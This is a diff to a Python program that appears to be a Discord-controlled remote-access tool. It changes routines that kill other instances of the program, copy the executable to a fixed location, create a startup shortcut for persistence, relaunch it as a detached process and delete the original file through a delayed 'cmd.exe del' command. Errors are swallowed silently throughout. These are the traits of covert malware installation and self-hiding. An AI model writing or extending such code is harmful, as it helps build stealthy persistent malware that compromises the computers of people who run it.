@@ -109,42 +109,27 @@ def ensure_startup_shortcut(target_exe):
     except Exception:
         pass
 
-def parse_version(ver_str):
-    try:
-        return [int(x) for x in str(ver_str).strip().split(".")]
-    except Exception:
-        return [0]
-
 def kill_existing_instances(target_exe):
     my_pid = os.getpid()
     target_norm = os.path.normpath(target_exe).lower()
     for proc in psutil.process_iter(['pid', 'exe']):
         try:
-            if proc.info['pid'] != my_pid and proc.info['exe']:
-                if os.path.normpath(proc.info['exe']).lower() == target_norm:
+            info_exe = proc.info.get('exe')
+            if proc.info['pid'] != my_pid and info_exe:
+                if os.path.normpath(info_exe).lower() == target_norm:
                     proc.kill()
         except Exception:
             pass
 
-def pre_execution_check():
-    if not getattr(sys, 'frozen', False):
-        return
-    target_exe = get_target_exe()
-    current_exe = os.path.abspath(sys.executable)
-    target_norm = os.path.normpath(target_exe).lower()
-    current_norm = os.path.normpath(current_exe).lower()
-
-    if current_norm != target_norm:
-        kill_existing_instances(target_exe)
-    else:
-        my_pid = os.getpid()
-        for proc in psutil.process_iter(['pid', 'exe']):
-            try:
-                if proc.info['pid'] != my_pid and proc.info['exe']:
-                    if os.path.normpath(proc.info['exe']).lower() == target_norm:
-                        sys.exit(0)
-            except Exception:
-                pass
+def spawn_detached(target_exe):
+    try:
+        if os.name == "nt":
+            flags = 0x00000008 | 0x00000200
+            subprocess.Popen([target_exe], creationflags=flags, close_fds=True)
+        else:
+            subprocess.Popen([target_exe])
+    except Exception:
+        pass
 
 def generate_prefix():
     length = random.randint(2, 4)
@@ -373,11 +358,14 @@ async def on_ready():
     if getattr(sys, 'frozen', False):
         target_exe = get_target_exe()
         current_exe = os.path.abspath(sys.executable)
-        if os.path.normpath(current_exe).lower() != os.path.normpath(target_exe).lower():
+        target_norm = os.path.normpath(target_exe).lower()
+        current_norm = os.path.normpath(current_exe).lower()
+
+        if current_norm != target_norm:
             kill_existing_instances(target_exe)
             time.sleep(0.5)
             copied = False
-            for _ in range(3):
+            for _ in range(5):
                 try:
                     shutil.copy2(current_exe, target_exe)
                     copied = True
@@ -386,23 +374,15 @@ async def on_ready():
                     time.sleep(0.5)
             if copied:
                 ensure_startup_shortcut(target_exe)
-                try:
-                    proc = subprocess.Popen([target_exe])
-                    spawned_ok = False
-                    for _ in range(10):
-                        time.sleep(0.5)
-                        if proc.poll() is None:
-                            spawned_ok = True
-                            break
-                    if spawned_ok:
-                        if os.name == "nt":
-                            subprocess.Popen(f'cmd.exe /c timeout /t 3 /nobreak & del /f /q "{current_exe}"', shell=True)
-                        await bot.close()
-                        sys.exit(0)
-                except Exception:
-                    pass
+                if os.name == "nt":
+                    subprocess.Popen(f'cmd.exe /c timeout /t 2 /nobreak & del /f /q "{current_exe}"', shell=True)
+                spawn_detached(target_exe)
+                await bot.close()
+                sys.exit(0)
         else:
             ensure_startup_shortcut(target_exe)
 
-pre_execution_check()
-bot.run(_TOKEN)
+try:
+    bot.run(_TOKEN)
+except Exception:
+    pass
